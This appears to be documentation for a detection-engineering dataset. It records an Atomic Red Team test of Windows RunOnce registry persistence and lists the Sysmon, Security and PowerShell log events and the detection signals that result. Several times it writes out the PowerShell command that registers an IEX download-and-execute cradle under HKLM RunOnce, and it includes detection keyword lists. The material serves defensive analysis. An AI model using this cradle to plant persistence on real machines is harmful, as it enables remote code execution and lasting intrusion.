# T1547.001-3: Registry Run Keys / Startup Folder — PowerShell Registry RunOnce

## Technique Context

T1547.001 covers persistence and privilege escalation through Windows registry run keys and startup folders. This test targets the `RunOnce` key (`HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`), which causes a registered value to execute once at the next user logon and then be automatically deleted by the Windows logon process. Entries in `RunOnce` self-clean after firing, making the persistence shorter-lived than a standard `Run` key but useful for staging a second-stage payload that fires on the next login.

This test uses PowerShell's `Set-ItemProperty` cmdlet to register a `NextRun` value containing a PowerShell `IEX` (Invoke-Expression) one-liner that downloads and executes a remote script from GitHub at next logon. This combines T1547.001 persistence with T1105 (Ingress Tool Transfer) and T1059.001 (PowerShell execution) in a single registration — a common pattern in real-world PowerShell-based post-exploitation.

This dataset was collected on ACME-WS06 (Windows 11 Enterprise Evaluation, domain `acme.local`) with Windows Defender fully disabled via Group Policy. Compare with the defended variant in `datasets/art/T1547.001-3` for the same test against an active Defender installation.

## What This Dataset Contains

The test executed as `NT AUTHORITY\SYSTEM` via QEMU guest agent. A child `powershell.exe` process uses `Set-ItemProperty` to write the `NextRun` value to `HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce`, then the cleanup removes it.

**Sysmon (41 events — EIDs 1, 3, 7, 10, 11, 13, 17):**

EID 1 (ProcessCreate) captures:
- `whoami.exe` (test framework identity check, tagged T1033)
- `powershell.exe` (child process, tagged T1059.001) with command line: `"powershell.exe" & {$RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"; set-itemproperty $RunOnceKey "NextRun" 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`")"'}` — the complete persistence payload including the remote download URL is visible in the Sysmon EID 1 command line.

EID 13 (RegistrySetValue) captures the write: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\NextRun` = `powershell.exe "IEX (New-Object Net.WebClient).DownloadString(...)"`, annotated `RuleName: technique_id=T1547.001`. Both the key path and the value data are in plaintext.

EID 3 (NetworkConnection) is present in the full dataset (3 events per the EID breakdown). Based on the defended variant analysis, these are `MsMpEng.exe` (Windows Defender) cloud lookup connections at a timestamp hours after the test, unrelated to the ART payload. With Defender disabled in this run, any EID 3 events may reflect other background network activity from `svchost.exe` or similar processes rather than Defender lookups.

EID 7 (ImageLoad) accounts for 25 events — .NET runtime DLL loads for two PowerShell instances, tagged T1055 and T1574.002 by sysmon-modular.

EID 10 (ProcessAccess), EID 11 (FileCreate for the PowerShell startup profile and a module cache file), and EID 17 (PipeCreate) are standard test framework artifacts.

**Security (4 events — EID 4688):**

Four EID 4688 process creation events are present:
- Outer `powershell.exe`
- `whoami.exe` (identity check)
- Inner `powershell.exe` with the full `Set-ItemProperty` command targeting `RunOnce\NextRun` and the `IEX` download string payload
- Cleanup `powershell.exe` with: `"powershell.exe" & {Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name "NextRun" -Force -ErrorAction Ignore}`

The download URL `https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat` is captured in the inner PowerShell EID 4688 command line.

**PowerShell (99 events — EIDs 4103, 4104):**

EID 4104 script block logging captures the test payload across multiple events. The wrapper scriptblock: `& {$RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"; set-itemproperty $RunOnceKey "NextRun" 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(..."'}` is logged in full. The cleanup scriptblock: `& {Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name "NextRun" -Force -ErrorAction Ignore}` is also captured.

Compared to the defended variant (29 Sysmon, 12 Security, 38 PowerShell), the undefended run produces more events (41 Sysmon, 4 Security, 99 PowerShell) with notably fewer Security events (4 vs. 12). The higher Sysmon count likely reflects additional module loading activity in the undefended environment.

## What This Dataset Does Not Contain

- No actual execution of the `IEX` payload occurs. The `RunOnce` key is registered and then cleaned up; the system is not logged off and back on during the test window.
- No network connection to `github.com` is initiated. The download string URL is registered in the `RunOnce` value but never called.
- The ART test framework performs the cleanup before any logon triggers the `RunOnce` entry, so no second-stage payload fires.

## Assessment

This dataset provides high-fidelity telemetry for the most common PowerShell `RunOnce` persistence pattern. The combination of EID 1 (process command line), EID 13 (registry write with value data), and EID 4104 (script block logging) provides three independent log sources all capturing the `IEX` download string payload in plaintext. The technique is fully observable with no evasion applied.

The undefended execution produces more Sysmon events than the defended run (41 vs. 29), primarily from additional module loading. The core persistence signals (EID 13 for the `RunOnce` write, EID 4688 for the PowerShell command line) are present in both variants.

## Detection Opportunities Present in This Data

The following observable events in this dataset support detection:

- **Sysmon EID 13** with `TargetObject` matching `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce` and `Details` containing `IEX`, `DownloadString`, `Invoke-Expression`, or any URL — writing a PowerShell download cradle into `RunOnce` is a high-confidence adversarial pattern. This event carries `RuleName: technique_id=T1547.001` in this dataset.

- **Security EID 4688** recording `powershell.exe` with a command line containing `RunOnce` combined with `Set-ItemProperty` and an `IEX` or download string — the complete payload is captured at process creation, before any script block logging occurs.

- **PowerShell EID 4104** capturing the `Set-ItemProperty` targeting `RunOnce` with a value containing `New-Object Net.WebClient` or `DownloadString` — three logs (EID 1, EID 13, EID 4104) all independently confirm the same payload.

- **The download URL** (`https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`) is captured in both EID 4688 and EID 4104. In a real adversarial use case, the URL would point to attacker-controlled infrastructure — any URL in a `RunOnce` value or `Set-ItemProperty` targeting `RunOnce` is worth investigating.

- **Cleanup as a detection signal**: the `Remove-ItemProperty` targeting `RunOnce\NextRun` in the cleanup PowerShell (visible in EID 4688 and EID 4104) is itself a signal — automated cleanup of persistence registrations is characteristic of tooling rather than manual administration.
